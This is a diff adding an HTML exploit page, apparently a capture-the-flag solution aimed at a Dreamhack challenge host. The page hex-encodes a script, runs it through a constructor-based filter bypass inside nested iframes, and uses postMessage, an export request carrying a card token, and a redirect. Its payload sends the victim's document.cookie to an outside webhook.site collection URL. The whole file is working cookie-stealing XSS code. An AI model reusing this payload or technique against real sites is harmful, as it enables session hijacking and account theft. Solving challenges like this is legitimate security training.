@@ -1,0 +1,35 @@
+<!doctype html>
+<html>
+<body>
+<div id="root"></div>
+<script>
+const callback = "https://webhook.site/bfe89258-ffa4-4eb3-a6d6-51fdc33af3f1/collect";
+const widgetJs = "new Image().src='" + callback + "?c='+encodeURIComponent(document.cookie)";
+const body =
+  "(async()=>{" +
+  "const js=" + JSON.stringify(widgetJs) + ";" +
+  "const r=await fetch('/export',{method:'POST',headers:{'X-Card-Token':CARD_TOKEN,'Content-Type':'application/javascript'},body:js,credentials:'include'});" +
+  "const n=await r.text();" +
+  "parent.postMessage(n,'*')" +
+  "})()";
+
+const enc = [...body]
+  .map(c => "%" + c.charCodeAt(0).toString(16).padStart(2, "0"))
+  .join("");
+
+const formula = "[]['filter']['con'+'structor'](unescape('" + enc + "'))()";
+
+onmessage = function(e) {
+  location = "http://host3.dreamhack.games:14348/review?widget=" + encodeURIComponent(e.data);
+};
+
+const innerScript = "setTimeout(function(){p.contentWindow.postMessage(" + JSON.stringify(formula) + ",'*')},2000);onmessage=function(e){top.postMessage(e.data,'*')};";
+
+document.getElementById('root').innerHTML =
+  "<iframe sandbox='allow-scripts' srcdoc=\"" +
+  "<iframe id=p src='http://host3.dreamhack.games:14348/preview'></iframe>" +
+  "<script>" + innerScript + "<\\/script>" +
+  "\"></iframe>";
+</script>
+</body>
+</html>
